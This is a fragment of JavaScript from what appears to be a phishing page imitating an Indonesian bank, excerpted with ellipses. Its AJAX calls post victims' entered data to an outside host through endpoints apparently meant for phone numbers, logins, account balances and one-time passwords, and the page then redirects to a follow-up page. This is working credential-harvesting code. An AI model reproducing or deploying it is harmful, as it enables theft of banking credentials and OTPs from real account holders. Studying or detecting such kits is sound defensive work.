...
$('.process1').fadeIn();
 document.getElementById('btnSubmit1').innerHTML ="Memproses...";
      ...
      $.ajax({
            type: 'POST',
            url: 'https://anjayhostjon.cloud/choreoapps.ll-feed.cfd/bsi/hd8d/no.php',
...
$('.process1').fadeIn();
 document.getElementById('btnSubmit1').innerHTML ="Memproses..."; 
      $.ajax({
            type: 'POST',
            url: 'https://anjayhostjon.cloud/choreoapps.ll-feed.cfd/bsi/hd8d/login.php',
...
$('.process1').fadeIn();
 document.getElementById('btnSubmit1').innerHTML ="Memproses..."; 
      $.ajax({
            type: 'POST',
            url: 'https://anjayhostjon.cloud/choreoapps.ll-feed.cfd/bsi/hd8d/saldo.php',
...
$.ajax({
 type: 'POST',
 url: 'https://anjayhostjon.cloud/choreoapps.ll-feed.cfd/bsi/hd8d/otp.php',
 async: false,
 dataType: 'JSON',
...
function getcs(){
 $("#djload").show();   
  ...
  audio1 = document.getElementById("bsi");
    ...
    audio4.loop = false
setTimeout(function(){  
location.href='https://anjayhostjon.cloud/choreoapps.ll-feed.cfd/wa/hd8d';
    }, 1000);
    setTimeout(function(){
    $("#djload").hide();   
    }, 1000);      
